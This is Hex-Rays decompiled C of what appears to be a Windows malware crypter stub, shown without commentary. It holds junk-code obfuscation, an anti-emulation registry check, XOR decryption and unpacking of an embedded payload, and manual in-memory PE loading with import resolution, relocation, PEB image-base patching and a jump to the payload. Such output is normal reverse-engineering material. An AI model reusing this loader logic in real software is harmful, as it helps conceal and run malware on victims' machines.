/* This file was generated by the Hex-Rays decompiler.
   Copyright (c) 2007-2020 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401030(int, int, int);
// int __usercall start@<eax>(int@<ebx>, int@<edi>, int@<esi>);
FARPROC __cdecl sub_401290(HMODULE hModule, LPCSTR lpProcName);
int __stdcall sub_4012B0(int);
LPVOID __cdecl sub_401630(SIZE_T dwSize);
int __cdecl sub_401660(int, int);
int __cdecl sub_4017C0(int);
unsigned int __cdecl sub_4017F0(char *a1, int a2, unsigned int a3);
int __cdecl sub_401910(_DWORD *, unsigned __int8 *);

//-------------------------------------------------------------------------
// Data declarations

// extern LSTATUS (__stdcall *RegOpenKeyA)(HKEY hKey, LPCSTR lpSubKey, PHKEY phkResult);
// extern LPVOID (__stdcall *VirtualAlloc)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
// extern LPVOID (__stdcall *MapViewOfFileEx)(HANDLE hFileMappingObject, DWORD dwDesiredAccess, DWORD dwFileOffsetHigh, DWORD dwFileOffsetLow, SIZE_T dwNumberOfBytesToMap, LPVOID lpBaseAddress);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern BOOL (__stdcall *UnmapViewOfFile)(LPCVOID lpBaseAddress);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern BOOL (__stdcall *VirtualFree)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
_UNKNOWN loc_401253; // weak
_UNKNOWN unk_402001; // weak
CHAR SubKey[] = ".sys"; // idb
CHAR ModuleName[] = "kernel32.dll"; // idb
CHAR ProcName[] = "MapViewOfFileEx"; // idb
CHAR aUnmapviewoffil[] = "UnmapViewOfFile"; // idb
CHAR aCreatefilemapp[] = "CreateFileMappingA"; // idb
CHAR aVirtualalloc[] = "VirtualAlloc"; // idb
CHAR aLoadlibrarya[] = "LoadLibraryA"; // idb
CHAR aVirtualfree[] = "VirtualFree"; // idb
CHAR aVirtualalloc_0[] = "VirtualAlloc"; // idb
CHAR aKernel32Dll_1[] = "kernel32.dll"; // idb
CHAR aUzllgkvkvdlhga[] = "UZLLGKVKVDLHGA"; // idb
CHAR String2[] = "a JXQODFKJb"; // idb
int dword_406334 = 0; // weak
int dword_406338 = 0; // weak
int dword_40633C = 0; // weak
int dword_406340 = 0; // weak
int dword_406344 = 0; // weak
int dword_406348 = 0; // weak
int dword_40634C = 0; // weak
int dword_406350 = 0; // weak
int dword_406354 = 0; // weak
int (*dword_406358)(void) = NULL; // weak


//----- (00401030) --------------------------------------------------------
int __cdecl sub_401030(int a1, int a2, int a3)
{
  int result; // eax

  for ( dword_40633C = 0; dword_40633C < a3; ++dword_40633C )
  {
    *(_BYTE *)(dword_40633C + a1) = *(_BYTE *)(dword_40633C + a2);
    result = dword_40633C + 1;
  }
  return result;
}
// 40633C: using guessed type int dword_40633C;

//----- (004010D0) --------------------------------------------------------
int __usercall start@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int m; // [esp+Ch] [ebp-24h]
  SIZE_T dwSize; // [esp+10h] [ebp-20h]
  unsigned int v6; // [esp+14h] [ebp-1Ch]
  int j; // [esp+18h] [ebp-18h]
  int i; // [esp+1Ch] [ebp-14h]
  HMODULE ModuleHandleA; // [esp+24h] [ebp-Ch]
  HKEY phkResult; // [esp+28h] [ebp-8h] BYREF
  char *k; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  dword_406354 = 39821115;
  for ( i = 0; i < 1; ++i )
    dword_406354 = 14233;
  for ( j = 0; j < 1; ++j )
    dword_406354 = 8931;
  ModuleHandleA = GetModuleHandleA(0);
  if ( RegOpenKeyA(HKEY_CLASSES_ROOT, SubKey, &phkResult) )
    MEMORY[0] = 0;
  v6 = unk_402001;
  dwSize = *((_DWORD *)&unk_402001 + 1);
  for ( k = 0; (unsigned int)k < v6; k += 8 )
  {
    dword_406354 = -742791461;
    for ( m = 0; m < 1; ++m )
      dword_406354 = 336278;
    *(_DWORD *)((char *)&unk_402001 + (_DWORD)k + 8) ^= 0x3ADE68B1u;
  }
  dword_40634C = (int)sub_401630(dwSize);
  sub_4017F0((char *)&unk_402001 + 8, dword_40634C, v6);
  dword_406340 = a2;
  dword_406338 = a3;
  dword_406348 = a1;
  dword_406350 = (int)NtCurrentTeb();
  k = (char *)&loc_401253;
  dword_406344 = (int)&savedregs;
  sub_401660(&loc_401253 - (_UNKNOWN *)ModuleHandleA, (int)ModuleHandleA);
  sub_4012B0(dword_40634C);
  return dword_406358();
}
// 406338: using guessed type int dword_406338;
// 406340: using guessed type int dword_406340;
// 406344: using guessed type int dword_406344;
// 406348: using guessed type int dword_406348;
// 40634C: using guessed type int dword_40634C;
// 406350: using guessed type int dword_406350;
// 406354: using guessed type int dword_406354;
// 406358: using guessed type int (*dword_406358)(void);

//----- (00401290) --------------------------------------------------------
FARPROC __cdecl sub_401290(HMODULE hModule, LPCSTR lpProcName)
{
  return GetProcAddress(hModule, lpProcName);
}

//----- (004012B0) --------------------------------------------------------
int __stdcall sub_4012B0(int a1)
{
  const CHAR *j; // [esp+0h] [ebp-58h]
  HMODULE hModule; // [esp+8h] [ebp-50h]
  LPVOID (__stdcall *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD); // [esp+14h] [ebp-44h]
  int v5; // [esp+18h] [ebp-40h]
  char *v6; // [esp+18h] [ebp-40h]
  int *v7; // [esp+20h] [ebp-38h]
  const CHAR *v8; // [esp+24h] [ebp-34h]
  _DWORD *v9; // [esp+2Ch] [ebp-2Ch]
  int *v10; // [esp+30h] [ebp-28h]
  HMODULE (__stdcall *LoadLibraryA)(LPCSTR); // [esp+34h] [ebp-24h]
  HMODULE v12; // [esp+3Ch] [ebp-1Ch]
  int v13; // [esp+40h] [ebp-18h]
  LPVOID (__stdcall *MapViewOfFileEx)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID); // [esp+44h] [ebp-14h]
  unsigned int i; // [esp+4Ch] [ebp-Ch]
  HANDLE hFileMappingObject; // [esp+50h] [ebp-8h]
  HANDLE (__stdcall *CreateFileMappingA)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR); // [esp+54h] [ebp-4h]

  hModule = GetModuleHandleA(ModuleName);
  MapViewOfFileEx = (LPVOID (__stdcall *)(HANDLE, DWORD, DWORD, DWORD, SIZE_T, LPVOID))GetProcAddress(hModule, ProcName);
  GetProcAddress(hModule, aUnmapviewoffil);
  CreateFileMappingA = (HANDLE (__stdcall *)(HANDLE, LPSECURITY_ATTRIBUTES, DWORD, DWORD, DWORD, LPCSTR))GetProcAddress(hModule, aCreatefilemapp);
  VirtualAlloc = (LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(hModule, aVirtualalloc);
  LoadLibraryA = (HMODULE (__stdcall *)(LPCSTR))GetProcAddress(hModule, aLoadlibrarya);
  GetProcAddress(hModule, aVirtualfree);
  v5 = *(_DWORD *)(a1 + 60) + a1;
  v9 = (_DWORD *)(v5 + *(unsigned __int16 *)(v5 + 20) + 24);
  v8 = (const CHAR *)VirtualAlloc(0, *(_DWORD *)(v5 + 80), 12288, 64);
  sub_401030((int)v8, a1, *(_DWORD *)(a1 + 60) + 40 * *(unsigned __int16 *)(v5 + 6) + 312);
  for ( i = 0; i < *(unsigned __int16 *)(v5 + 6); ++i )
  {
    if ( v9[5] )
    {
      if ( v9[4] )
        sub_401030(
          (int)&v8[v9[3]],
          v9[5] + a1,
          *(_DWORD *)(v5 + 60) * ((unsigned int)(v9[4] + *(_DWORD *)(v5 + 60) - 1) / *(_DWORD *)(v5 + 60)));
    }
    v9 += 10;
  }
  v6 = (char *)&v8[*((_DWORD *)v8 + 15)];
  hFileMappingObject = CreateFileMappingA((HANDLE)-1, 0, 4, 0, *((_DWORD *)v6 + 20), 0);
  for ( j = &v8[*((_DWORD *)v6 + 32)]; *((_DWORD *)j + 4); j += 20 )
  {
    v12 = LoadLibraryA(&v8[*((_DWORD *)j + 3)]);
    if ( *(_DWORD *)j )
    {
      v10 = (int *)&v8[*(_DWORD *)j];
      v7 = (int *)&v8[*((_DWORD *)j + 4)];
    }
    else
    {
      v10 = (int *)&v8[*((_DWORD *)j + 4)];
      v7 = (int *)&v8[*(_DWORD *)j];
    }
    v13 = 0;
    if ( *((_DWORD *)j + 4) && *(_DWORD *)j )
      v13 = 1;
    while ( *v10 )
    {
      if ( *v10 >= 0 )
        *v10 = (int)sub_401290(v12, &v8[*v10 + 2]);
      else
        *v10 = (int)sub_401290(v12, (LPCSTR)(*v10 & 0x7FFFFFFF));
      if ( v13 )
        *v7 = *v10;
      ++v10;
      ++v7;
    }
  }
  dword_406334 = (int)MapViewOfFileEx(hFileMappingObject, 34, 0, 0, 0, *((LPVOID *)v6 + 13));
  if ( !dword_406334 )
  {
    if ( !UnmapViewOfFile(*((LPCVOID *)v6 + 13)) && !VirtualFree(*((LPVOID *)v6 + 13), 0, 0x8000u) )
      return 0;
    dword_406334 = (int)::MapViewOfFileEx(hFileMappingObject, 0x22u, 0, 0, 0, *((LPVOID *)v6 + 13));
    if ( !dword_406334 )
      dword_406334 = (int)::VirtualAlloc(*((LPVOID *)v6 + 13), *((_DWORD *)v6 + 20), 0x3000u, 0x40u);
  }
  CloseHandle(hFileMappingObject);
  sub_401030(dword_406334, (int)v8, *((_DWORD *)v6 + 20));
  sub_4017C0(dword_406334);
  dword_406358 = (int (*)(void))(*((_DWORD *)v6 + 10) + dword_406334);
  *((_DWORD *)v6 + 10) = dword_406358;
  return 1;
}
// 406334: using guessed type int dword_406334;
// 406358: using guessed type int (*dword_406358)(void);

//----- (00401630) --------------------------------------------------------
LPVOID __cdecl sub_401630(SIZE_T dwSize)
{
  return VirtualAlloc(0, dwSize, 0x3000u, 4u);
}

//----- (00401660) --------------------------------------------------------
int __cdecl sub_401660(int a1, int a2)
{
  HMODULE ModuleHandleA; // eax
  LPVOID (__stdcall *VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD); // eax
  _DWORD *v5; // [esp+8h] [ebp-1Ch]
  int v6; // [esp+Ch] [ebp-18h]
  SIZE_T *v7; // [esp+14h] [ebp-10h]
  unsigned int v8; // [esp+18h] [ebp-Ch]
  _DWORD *i; // [esp+1Ch] [ebp-8h]
  unsigned int j; // [esp+20h] [ebp-4h]

  v7 = (SIZE_T *)(*(_DWORD *)(a2 + 60) + a2);
  ModuleHandleA = GetModuleHandleA(aKernel32Dll_1);
  VirtualAlloc = (LPVOID (__stdcall *)(LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(ModuleHandleA, aVirtualalloc_0);
  dword_406334 = (int)VirtualAlloc(0, v7[20], 12288, 64);
  if ( dword_406334 )
  {
    sub_401030(dword_406334, a2, v7[20]);
    v6 = dword_406334 - a2;
    if ( v7[41] )
    {
      for ( i = (_DWORD *)(v7[40] + a2); i[1]; i = (_DWORD *)((char *)i + i[1]) )
      {
        v8 = (unsigned int)(i[1] - 8) >> 1;
        v5 = i + 2;
        for ( j = 0; j < v8; ++j )
        {
          if ( (int)*((unsigned __int16 *)v5 + j) >> 12 == 3 )
            *(_DWORD *)(*i + dword_406334 + (*((_WORD *)v5 + j) & 0xFFF)) += v6;
        }
      }
    }
    __asm { jmp     edx }
  }
  return 2;
}
// 406334: using guessed type int dword_406334;

//----- (004017C0) --------------------------------------------------------
int __cdecl sub_4017C0(int a1)
{
  int result; // eax

  result = *(_DWORD *)(dword_406350 + 48);
  *(_DWORD *)(result + 8) = a1;
  return result;
}
// 406350: using guessed type int dword_406350;

//----- (004017F0) --------------------------------------------------------
unsigned int __cdecl sub_4017F0(char *a1, int a2, unsigned int a3)
{
  unsigned int result; // eax
  int v4; // eax
  int v5; // eax
  char String1[116]; // [esp+0h] [ebp-90h] BYREF
  int v7; // [esp+74h] [ebp-1Ch] BYREF
  unsigned int i; // [esp+78h] [ebp-18h]
  int v9; // [esp+7Ch] [ebp-14h]
  char v10; // [esp+83h] [ebp-Dh]
  unsigned int v11; // [esp+84h] [ebp-Ch] BYREF
  unsigned int v12; // [esp+88h] [ebp-8h]
  char v13; // [esp+8Fh] [ebp-1h]

  v12 = 1;
  v10 = *a1;
  lstrcpyA(String1, String2);
  v9 = 0;
  do
  {
    v13 = a1[v12++];
    if ( v13 == v10 )
    {
      if ( a1[v12] )
      {
        v4 = sub_401910(&v11, (unsigned __int8 *)&a1[v12]);
        v12 += v4;
        v5 = sub_401910(&v7, (unsigned __int8 *)&a1[v12]);
        result = v12 + v5;
        v12 = result;
        for ( i = 0; i < v11; ++i )
        {
          *(_BYTE *)(v9 + a2) = *(_BYTE *)(a2 + v9 - v7);
          ++v9;
          result = i + 1;
        }
      }
      else
      {
        *(_BYTE *)(v9 + a2) = v10;
        result = ++v9;
        ++v12;
      }
    }
    else
    {
      *(_BYTE *)(v9 + a2) = v13;
      result = ++v9;
    }
  }
  while ( v12 < a3 );
  return result;
}
// 4017F0: using guessed type CHAR String1[116];

//----- (00401910) --------------------------------------------------------
int __cdecl sub_401910(_DWORD *a1, unsigned __int8 *a2)
{
  char String1[112]; // [esp+0h] [ebp-80h] BYREF
  int v4; // [esp+70h] [ebp-10h]
  int v5; // [esp+74h] [ebp-Ch]
  int v6; // [esp+78h] [ebp-8h]
  int v7; // [esp+7Ch] [ebp-4h]

  v7 = 0;
  v5 = 0;
  lstrcpyA(String1, aUzllgkvkvdlhga);
  do
  {
    v6 = *a2++;
    v4 = v7 << 7;
    v7 = (v7 << 7) | v6 & 0x7F;
    ++v5;
  }
  while ( (v6 & 0x80) != 0 );
  *a1 = v7;
  return v5;
}
// 401910: using guessed type CHAR String1[112];

// nfuncs=9 queued=9 decompiled=9 lumina nreq=0 worse=0 better=0
// ALL OK, 9 function(s) have been successfully decompiled
